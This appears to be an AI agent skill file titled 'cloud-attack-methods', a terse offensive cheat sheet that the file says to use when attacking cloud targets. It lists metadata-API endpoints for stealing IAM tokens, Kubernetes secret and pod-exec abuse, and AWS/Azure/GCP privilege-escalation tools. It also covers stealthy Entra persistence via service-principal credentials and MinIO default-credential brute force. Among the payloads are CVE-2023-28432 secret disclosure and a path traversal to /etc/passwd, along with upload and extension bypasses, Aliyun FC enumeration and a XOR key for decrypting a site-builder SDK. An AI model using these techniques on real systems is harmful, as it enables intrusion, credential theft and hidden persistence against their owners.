---
name: cloud-attack-methods
description: >-
  Cloud attacks: metadata API, S3/K8s, AWS/Azure/GCP identity privilege escalation, MinIO matrix, Aliyun FC, ChengZi SDK decryption. Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-ex.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Cloud Attack Methods

```
=== Cloud ===
Metadata API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | Aliyun 100.100.100.200
Object storage: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1 grabs secrets/exec pods → cluster-admin
🚨Cloud identity attack (privilege escalation and lateral movement after getting a key/token):
  AWS: enumerate-iam/cloudfox/ScoutSuite enumerates permissions → pacu automatically finds privesc (iam:PassRole + lambda/ec2/glue etc. 18+ entries) | STS AssumeRole across accounts | Lambda environment variables steal keys
  Azure/Entra: roadtools (roadrecon dump tenant)/AADInternals | device code/refresh token | Managed Identity IMDS steals token | Automation Runbook RCE | Key Vault reads secrets
  Entra post-exploitation: GraphRunner (Graph API enumeration/mail search/backdoor App insertion) | service principal adds credentials (stealthy persistence) | dynamic group abuse | PRT theft for lateral movement
  GCP: service account token (metadata) | serviceAccountTokenCreator/actAs privilege escalation | gcloud enumerate
🚨K8s deep-dive (having obtained cluster network/pod): kubelet 10250 unauth (/pods list, /exec into any container) | etcd 2379 no auth reads all secrets | API Server anonymous | RBAC over-privileged SA (kubectl auth can-i --list) | privileged pod mounts host to escape | cloud K8s hijacks node identity → IMDS
🚨MinIO attack matrix:
  Fingerprinting: Server: MinIO | /minio/health/live → 200 (empty body) | /minio/health/cluster → 200 | 9000 (API) + 9001 (Console)
  Console brute force: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → JWT provider configuration required
  CVE-2023-28432: POST /minio/health/cluster?verify (information disclosure, returns environment variables including MINIO_SECRET_KEY)
  CVE-2023-28434: path traversal /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName (unavailable if already patched)
  Anonymous access: GET /bucket-name/ → ListBucket (200) = anonymous read | PUT /bucket/file → AccessDenied (403) = anonymous write forbidden
  Upload bypass: the application-layer sign verifies the dir parameter but does not validate it → can write to any bucket (sign validates only cid+et+og, excluding dir)
  Extension bypass: .jsp;.jpg / .jsp%00.jpg passes the application blacklist but MinIO stores it as a static file (image/jpeg), not executed
🚨Aliyun FC function (fcapp.run) enumeration:
  Identification: URL contains *.cn-{region}.fcapp.run → Aliyun Function Compute (Serverless)
  Traits: POST returns "unauthorized method 'POST'" (405) = accepts GET only | 200+{"code":200,"msg":"Forbidden"} = the path exists but parameters are missing
  Exploit: GET /{path}/{id}.html → 302 redirect leaks the real CDN domain + auth_key signed URL (exposes CDN domain/bucket structure/signing algorithm)
  Enumeration: different path prefixes correspond to different apps (/mkzavakx/ vs /kpqwbcoq/) | invalid ID → 302 to qzone.qq.com/404.html (fallback)
  Path traversal: FC normalizes correctly (../ invalid), but you can enumerate different function paths
  CDN auth_key (Kunlun CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → cracking needs the privatekey | x-tengine-error exposes "denied by req auth"
  FC→CDN chain: the FC function generates a signed URL → kunlun/kijwsks.com CDN download | spoof referer as Baidu (mo.baidu.com)
🚨ChengZi site builder (ChengZi SDK) decryption:
  Initialization: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → encrypted (base64) response
  Decryption: single-byte XOR key=0x96 → JSON (channelCode/fu download URL/csu tracking URL/ph install-package hash)
  d3504.cn fronts with Cloudflare + Aliyun DDoS protection (aliyunddos) + Kunlun CDN (kunlunaq.com) → layered protection
  Key: the fu field = the real APK-download FC function URL (may be in a region different from the landing page!) | csu = click-tracking callback URL
```
